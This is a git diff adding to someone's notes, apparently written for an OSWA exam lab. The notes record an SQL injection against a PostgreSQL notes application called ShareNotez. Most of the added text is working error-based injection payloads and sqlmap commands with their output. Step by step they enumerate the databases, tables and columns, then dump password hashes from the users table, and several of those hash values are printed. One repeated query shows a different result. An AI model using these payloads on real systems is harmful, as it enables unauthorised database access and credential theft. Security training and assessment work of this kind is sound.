@@ -64,8 +64,8 @@ error i am receiving
 ```bash
 {"status": "error", "message":"An error occurred. StatementCallback; bad SQL grammar [DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';]; nested exception is org.postgresql.util.PSQLException: Unterminated string literal started at position 91 in SQL DELETE FROM notes WHERE id = '--b079a6c0-fcd2-43b1-8feb-2147fac1eb0e'''-SELECT current_user';. Expected  char"}
 ```
-
-
+`sqlmap` stuff
+```
 1.
 sqlmap -r delete.req -p id --batch --level=5 --risk=3 --technique=BEUSTQ --dbs
 
@@ -82,3 +82,177 @@ sqlmap -r delete.req -p id --batch --level=5 --risk=3 --technique=BEUSTQ --dbs
 
 2.sqlmap -r delete.req -p id --prefix="'" --suffix="--" --dbs
 --prefix and --suffix help when the backend wraps the id in single quotes.
+
+```
+## Manual Injection Testing 
+first working query, this is really annoying because i need to get a new `uuid` note request to continue enumerating the database
+- also must `url encode` to work
+
+### Listing Databases
+the goal is to map out the database and hopefully be able to dump from it
+```bash
+'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 0) AS integer))--
+'; (SELECT CAST(SUBSTRING(version() FROM 'PostgreSQL ([0-9]+)\.') AS INTEGER);--
+database: postgres
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic36.png]]
+```bash
+'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 1) AS integer))--
+
+database: lophostrix
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic37.png]]
+```bash
+'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 2) AS integer))--
+
+database: template1
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic38.png]]
+```bash
+'; (SELECT CAST((SELECT datname FROM pg_database LIMIT 1 OFFSET 3) AS integer))--
+
+database: template0
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic39.png]]
+### Listing Tables
+```bash
+'; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 0) AS integer))--
+
+table: users
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic40.png]]
+```bash
+'; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 1) AS integer))--
+
+table: notes
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic41.png]]
+```bash
+'; (SELECT CAST((SELECT table_name FROM information_schema.tables WHERE table_schema = 'public' LIMIT 1 OFFSET 2) AS integer))--
+
+table: likes
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic42.png]]
+
+### Listing Columns in users table
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 0) AS integer))--
+
+column in users table: id
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic43.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 1) AS integer))--
+
+column in users table: isadmin
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic44.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 2) AS integer))--
+
+column in users table: islocked
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic45.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 3) AS integer))--
+
+column in users table: username
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic46.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT 1 OFFSET 4) AS integer))--
+
+column in users table: password
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic47.png]]
+
+
+### Listing passwords from users table
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 0) AS INTEGER); --
+
+password from users table: e84edOziE/Knw2SKbNoyY5PGseegEfUGTyPxSpzuD3k=
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic48.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 1) AS INTEGER); --
+
+password from users table: qX+gUfRZNLo+5vfTQXNWyzKrhae7K+QQUavIQ0t1gP4=
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic49.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 2) AS INTEGER); -- 
+
+password from users table: aJOPMM2Yc/wmVgpqWROHVVxR+5tAaH+8/bdPkIyAOe0=
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic50.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 3) AS INTEGER); -- 
+
+password from users table: *****
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic51.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 4) AS INTEGER); -- 
+
+password from users table: *****
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic52.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 5) AS INTEGER); -- 
+
+password from users table: *****
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic53.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 6) AS INTEGER); -- 
+
+password from users table: *****
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic54.png]]
+```bash
+'; SELECT 1 / CAST((SELECT password FROM users LIMIT 1 OFFSET 6) AS INTEGER); -- 
+
+password from users table: YDA64iuZiGG847KPM+7BvnWKITyGyTwHbb6fVYwRx1I=
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic55.png]]
+
+### Listing Columns in notes table
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 0) AS integer))--
+
+column in notes table: id
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic56.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 1) AS integer))--
+
+column in notes table: owner_id
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic57.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 2) AS integer))--
+
+column in notes table: public
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic58.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 3) AS integer))--
+
+column in notes table: needsreview
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic59.png]]
+```bash
+'; (SELECT CAST((SELECT column_name FROM information_schema.columns WHERE table_name = 'notes' LIMIT 1 OFFSET 4) AS integer))--
+
+column in notes table: content
+```
+![[ss-20250919-OSWA-Exam-ShareNotez-local.txt-pic60.png]]
+
+### Listing content from notes table
+
+```bash
+'; SELECT 1 / CAST((SELECT content FROM notes LIMIT 1 OFFSET 0) AS INTEGER); --
+
+content from notes table: e84edOziE/Knw2SKbNoyY5PGseegEfUGTyPxSpzuD3k=
+```
